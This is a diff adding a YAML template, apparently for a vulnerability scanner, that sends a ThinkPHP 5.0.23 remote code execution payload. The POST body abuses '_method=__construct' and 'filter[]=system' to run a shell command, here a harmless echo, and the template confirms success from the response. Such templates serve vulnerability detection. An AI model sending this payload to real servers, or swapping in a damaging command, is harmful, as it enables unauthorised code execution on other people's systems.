@@ -1,0 +1,10 @@
+name: ThinkPHP-5-0-23-RCE-Exploit
+steps:
+  - method: POST
+    path: /index.php?s=captcha
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=echo%20ThinkPHP_RCE_Success"
+    validate:
+      status: [200]
+      bodyContains: ["ThinkPHP_RCE_Success"]
